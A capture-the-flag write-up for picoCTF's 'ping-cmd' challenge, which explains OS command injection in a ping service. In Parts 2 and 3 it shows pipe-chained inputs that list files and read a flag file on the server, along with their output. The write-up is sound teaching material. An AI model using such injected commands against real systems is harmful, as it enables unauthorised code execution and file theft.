# **picoCTF Challenge:** ***ping-cmd***

- [Challenge information](#challenge-information)
- [Solution](#solution)
- [References](#references)

---

## **Challenge information**

<table>
  <tr><td><strong>Level</strong></td><td>🟢 Easy</td></tr>
  <tr><td><strong>Category</strong></td><td>General Skills</td></tr>
  <tr><td><strong>Event</strong></td><td>picoCTF 2026</td></tr>
  <tr><td><strong>Author</strong></td><td>Yahaya Meddy</td></tr>
</table>

---

**Description:**
Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you get a little creative with your input?

---

**Connect via netcat:**
```
nc mysterious-sea.picoctf.net 56711
```

---

> **Hint:** The program uses a shell command behind the scenes. Sometimes, You can run more than one command at a time.

---

## **Solution**

### **Part 1 -- Testing the intended behavior**
```bash
Ridez-picoctf@webshell:~$ nc mysterious-sea.picoctf.net 56711
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=9.56 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=9.79 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 9.556/9.674/9.793/0.118 ms
```

> **Explaination:**
We connect to the server and provide the expected input `8.8.8.8`. This is Google's public DNS address. The server runs `ping 8.8.8.8` and returns the standard ping output showing two successful replies. The server is executing a `ping` shell command with our input, which means our input is being passed directly into a shell. This is the first requirement for command injection to be possible.

---

### **Part 2 -- Injecting a second command**
```bash
Ridez-picoctf@webshell:~$ nc mysterious-sea.picoctf.net 56711
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8 | ls
flag.txt
script.sh
```

> **Explaination:**
Instead of just `8.8.8.8`, we append `| ls` to the input. The `|` (pipe) operator allows us to chain a second command. The server executes `ping 8.8.8.8 | ls`. The server claims to have tight security and only allows `8.8.8.8`, but the validation is clearly only checking that the input *starts with* or *contains* `8.8.8.8`. Since it only checks if it contains the desired ping, it never strips what comes after. By appending `| ls` we confirm that arbitrary commands can be injected and executed server-side. The directory listing reveals two files.

---

### **Part 3 -- Reading the flag**
```bash
Ridez-picoctf@webshell:~$ nc mysterious-sea.picoctf.net 56711
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8 | cat flag.txt
picoCTF{redacted}
```

> **Explaination:**
We repeat the same injection technique, this time replacing `ls` with `cat flag.txt`. `cat` is the base command to read a file. The same vulnerability that let us run `ls` lets us run any command. This is the core danger of command injection. If one command can be executed, *all* can.

---

## **References**
- [Command Injection - OWASP](https://owasp.org/www-community/attacks/Command_Injection)